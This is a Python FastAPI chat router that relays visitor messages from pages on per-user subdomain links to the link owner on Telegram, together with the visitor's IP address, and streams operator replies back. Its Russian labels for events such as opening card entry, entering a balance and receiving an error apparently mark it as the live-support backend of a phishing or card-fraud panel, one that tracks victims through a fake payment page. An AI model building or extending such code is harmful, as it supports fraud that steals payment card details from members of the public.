import asyncio
import logging
import os
import secrets

import httpx
from fastapi import APIRouter, Request
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel

from api.cache import (
    append_chat_message,
    create_chat_session,
    get_chat_session,
    get_chat_steps,
    pop_operator_reply,
    push_operator_reply,
)
from db.crud.links import get_link_by_subdomain_and_id
from db.crud.users import get_or_create_user
from db.models import User
from db.session import get_session

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/chat")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
NOTIFY_CHAT_ID = os.getenv("NOTIFY_CHAT_ID", "")
ADMIN_ID = os.getenv("ADMIN_ID", "")


# ── translation (reuse from support handler) ──────────────────────────────────

async def _translate(text: str, dest: str) -> str:
    try:
        from deep_translator import GoogleTranslator
        result = GoogleTranslator(source="auto", target=dest).translate(text)
        return result or text
    except Exception:
        return text


async def _detect_lang(text: str) -> str:
    try:
        from deep_translator import single_detection
        lang = single_detection(text, api_key=None)
        return lang or "ru"
    except Exception:
        return "ru"


# ── models ────────────────────────────────────────────────────────────────────

class StartSession(BaseModel):
    subdomain: str
    link_id: str


class VisitorMessage(BaseModel):
    session_id: str
    subdomain: str
    link_id: str
    step: int | None = None
    trigger: str | None = None   # open | card | balance | error | user
    text: str = ""


# ── helpers ───────────────────────────────────────────────────────────────────

async def _resolve_owner(subdomain: str, link_id: str) -> tuple[str, int | None]:
    """Returns (display_string, tg_user_id)."""
    try:
        async with get_session() as session:
            link = await get_link_by_subdomain_and_id(session, subdomain, link_id)
            if link:
                owner = await session.get(User, link.user_id)
                if owner:
                    label = f"@{owner.username}" if owner.username else f"id:{owner.id}"
                    return label, owner.id
    except Exception as exc:
        logger.error("resolve_owner: %s", exc)
    return "неизвестен", None


async def _send_telegram(chat_id: str | int, text: str,
                         reply_markup: dict | None = None) -> None:
    if not BOT_TOKEN or not chat_id:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload: dict = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            r = await client.post(url, json=payload)
            if r.status_code != 200:
                logger.error("sendMessage failed: %s", r.text)
    except Exception as exc:
        logger.error("sendMessage exc: %s", exc)


# ── POST /chat/session ────────────────────────────────────────────────────────

@router.post("/session")
async def start_session(body: StartSession) -> JSONResponse:
    session_id = secrets.token_urlsafe(16)
    await create_chat_session(session_id, body.subdomain, body.link_id)
    return JSONResponse({"session_id": session_id})


# ── GET /chat/steps ───────────────────────────────────────────────────────────

@router.get("/steps")
async def get_steps(subdomain: str, link_id: str) -> JSONResponse:
    steps = await get_chat_steps(subdomain, link_id)
    return JSONResponse(steps)


# ── POST /chat/message ────────────────────────────────────────────────────────

@router.post("/message")
async def visitor_message(body: VisitorMessage, request: Request) -> JSONResponse:
    if not body.text.strip() and not body.trigger:
        return JSONResponse({"ok": False, "error": "empty"}, status_code=400)

    sess = await get_chat_session(body.session_id)
    if not sess:
        await create_chat_session(body.session_id, body.subdomain, body.link_id)

    visitor_lang = await _detect_lang(body.text) if body.text.strip() else "ru"
    ru_text = body.text
    if visitor_lang != "ru" and body.text.strip():
        ru_text = await _translate(body.text, dest="ru")

    await append_chat_message(body.session_id, "visitor", body.text)

    owner_label, owner_tg_id = await _resolve_owner(body.subdomain, body.link_id)
    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "?")
    )

    trigger_label = {
        "open": "📂 открыл страницу",
        "card": "💳 открыл ввод карты",
        "balance": "💰 ввёл сумму баланса",
        "error": "⚠️ получил ошибку",
        "user": "✍️ написал сообщение",
    }.get(body.trigger or "user", "✍️ написал сообщение")

    header = (
        f"💬 <b>Чат со страницы</b> [{trigger_label}]\n"
        f"🔗 {body.subdomain}/{body.link_id} | 👤 {owner_label} | 🌐 {ip}\n"
        f"🗨 Сессия: <code>{body.session_id}</code>\n"
    )
    if visitor_lang != "ru" and ru_text != body.text:
        msg_body = f"<i>[{visitor_lang}→ru]</i> {ru_text}"
    else:
        msg_body = ru_text or f"<i>[{trigger_label}]</i>"

    reply_kb = {
        "inline_keyboard": [[{
            "text": "↩️ Ответить",
            "callback_data": f"wchat_reply:{body.session_id}:{visitor_lang}"
        }]]
    }

    # owner of the link gets the notification; fall back to global admin
    notify_id = owner_tg_id or ADMIN_ID or NOTIFY_CHAT_ID
    if notify_id:
        await _send_telegram(notify_id, header + msg_body, reply_markup=reply_kb)

    return JSONResponse({"ok": True})


# ── GET /chat/stream/{session_id} (SSE) ───────────────────────────────────────

@router.get("/stream/{session_id}")
async def chat_stream(session_id: str):
    async def event_gen():
        yield f"data: connected\n\n"
        while True:
            try:
                reply = await pop_operator_reply(session_id, timeout=25)
                if reply is not None:
                    import json as _json
                    payload = _json.dumps({"text": reply}, ensure_ascii=False)
                    yield f"data: {payload}\n\n"
                else:
                    yield f": ping\n\n"
            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.error("SSE error: %s", exc)
                break

    return StreamingResponse(
        event_gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )
